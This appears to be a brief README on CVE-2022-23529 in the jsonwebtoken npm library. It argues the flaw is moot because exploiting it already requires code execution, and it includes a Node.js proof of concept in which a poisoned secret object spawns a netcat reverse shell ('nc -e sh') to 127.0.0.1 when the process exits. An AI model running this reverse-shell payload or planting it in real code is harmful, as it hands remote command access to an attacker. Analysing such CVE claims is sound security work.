# CVE-2022-23529

The JSON Web Token (JWT) library versions prior to 3.4.6, 4.0.4, and 4.1.5 are vulnerable to RCE if you already have RCE.

Due to the preconditions (RCE), this vulnerability does not make any sense.

In order to exploit this vulnerability an attacker would need all of the following conditions to be true:

- The server does not store secret keys securely.
- The attacker needs to have access to and control the secret keys.
- The attacker can write and execute arbitrary code.


## npm install jsonwebtoken@8.5.1

```var jwt = require('jsonwebtoken');```

## create a token using the servers secret

```var token = jwt.sign({"x":"y"}, 'servers_secret');```

## create malicious object containing a reverse shell (node.js)

```
var poisoned_secret_on_server = { 
    toString : ()=> {console.log('PWNED AFTER PASRSING TOKEN');
        process.on('exit', ()=> {
            require('child_process').exec('nc -e sh 127.0.0.1 9001');
        });
        process.exit(0)
    }
}
```

## server verifies the token using malicious object stored as secret

```jwt.verify(token, poisoned_secret_on_server);```
